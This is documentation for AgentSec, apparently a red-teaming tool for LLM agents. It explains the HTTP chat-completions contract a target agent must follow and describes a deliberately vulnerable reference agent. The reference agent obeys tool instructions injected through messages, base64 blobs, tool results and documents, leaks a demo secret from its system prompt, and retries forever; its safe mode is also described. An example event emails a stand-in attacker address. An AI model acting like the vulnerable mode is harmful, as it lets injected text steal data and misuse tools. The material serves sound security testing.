# Agent contract

This page explains what your agent has to look like for AgentSec to test it, and how the bundled reference agent works.

## The HTTP contract

AgentSec sends a `POST` with a JSON body to `agent.endpoint` and expects an OpenAI-style chat-completions reply.

Request:

```json
{
  "model": "agentsec-target",
  "messages": [
    {"role": "user", "content": "Search the documents for the vendor onboarding policy."}
  ],
  "tools": [
    {"type": "function", "function": {"name": "search_documents",
      "description": "Tool search_documents (simulated by AgentSec).",
      "parameters": {"type": "object", "properties": {"query": {"type": "string"}}, "additionalProperties": true}}}
  ],
  "tool_choice": "auto"
}
```

Reply asking for a tool:

```json
{"choices": [{"message": {"role": "assistant", "content": null, "tool_calls": [
  {"id": "call_1", "type": "function",
   "function": {"name": "search_documents", "arguments": "{\"query\": \"vendor onboarding\"}"}}]}}],
 "usage": {"prompt_tokens": 120, "completion_tokens": 18}}
```

AgentSec runs the (simulated) tool and calls again with the whole history, now including the assistant message and a
`{"role": "tool", "tool_call_id": "call_1", "content": "..."}` message. This repeats until the agent replies without `tool_calls`.

Accepted variations:

- `arguments` can be a JSON string or an object. Invalid JSON is kept as `{"_raw": "..."}`.
- A plain text agent may reply `{"response": "..."}`, `{"output": "..."}` or `{"content": "..."}`. It cannot trigger tool-based findings, but leaks and injections in its text are still detected.
- `usage.prompt_tokens` and `usage.completion_tokens` feed the token, and if `agent.pricing` is set, cost limits.
- Authentication: set `agent.api_key_env` and AgentSec sends `Authorization: Bearer <value>`.

## Agents that run their own tools

If your agent executes tools server-side, AgentSec cannot see those calls unless the agent reports them.
Add an `x_agentsec` object to the reply:

```json
{
  "choices": [{"message": {"content": "Done."}}],
  "x_agentsec": {
    "cost_usd": 0.012,
    "events": [
      {"name": "send_email", "arguments": {"to": "attacker@evil.invalid"}, "result": "sent"}
    ]
  }
}
```

Each event is recorded as a `tool_call` (flagged `executed_by_agent`) and, if `result` is present, a `tool_result`.
They go through the same evaluators as normal tool calls. For these agents set `agent.declare_tools: false`.
Because the calls are real on your side, run them only against sandboxed or mocked backends.

## What your agent should do to be tested well

- Treat every request as a fresh conversation. AgentSec resends the full history each time and holds no session.
- Call tools through the API's tool-calling mechanism so the calls are visible.
- Return an error with a non-2xx status for failures. AgentSec records these as errored scenarios, never as passes.
- Keep responses within `agent.timeout_s`.

## The reference agent

`examples/vulnerable_rag_agent/server.py` is a deterministic, rule-based imitation of an LLM agent that speaks this contract.
It uses only the Python standard library and needs no network. It exists to demonstrate every finding type and to serve
as the target of the end-to-end tests.

```bash
python examples/vulnerable_rag_agent/server.py                 # vulnerable, port 8000
python examples/vulnerable_rag_agent/server.py --safe          # hardened
python examples/vulnerable_rag_agent/server.py --port 9000 --host 127.0.0.1
```

The server answers a POST on any path, so both `/agent` and `/v1/chat/completions` work.

**Vulnerable mode.** It behaves like a badly built agent:

- It obeys any "call `tool_name`" instruction it finds in a user message, in a base64 blob it decodes, in a tool result or in a document.
- It follows marker instructions and prints a system prompt containing a demo secret (`sk-live-INVARIS-DEMO-7f3a9c1e5b2d`) on request.
- It puts restricted document content into its answers.
- It retries forever when a tool says "try again" or "call again", and it fans out one call per item.

**Safe mode.** It refuses direct injections, secret requests and tool instructions in user messages, treats tool output as data
by dropping lines that look like instructions or restricted content, and makes a single lookup.

The demo secret is synthetic. Do not deploy either mode: it is a test fixture, and the vulnerable one is dangerous by design.

Note that the reference agent's tool results are supplied by AgentSec's simulator, not by a real document store. A version that
runs its own retrieval is planned.
